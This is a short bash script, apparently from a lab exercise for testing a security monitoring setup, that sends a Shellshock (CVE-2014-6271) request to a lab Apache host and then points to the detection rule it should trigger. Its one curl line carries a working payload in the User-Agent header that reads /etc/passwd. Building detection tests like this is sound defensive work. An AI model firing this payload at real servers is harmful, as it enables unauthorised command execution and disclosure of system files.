#!/bin/bash
# UC-06: simulate Shellshock (CVE-2014-6271) HTTP request against the Apache victim.
# Source: S2 p.38-39, S5 img17.  Expected: rule 31168 level 15 + MITRE T1068/T1190.
TARGET="${1:-192.168.100.108}"
curl -s -H "User-Agent: () { :; }; /bin/cat /etc/passwd" "http://$TARGET" > /dev/null
echo "Sent Shellshock payload to $TARGET — check dashboard: rule.description:Shellshock attack detected"
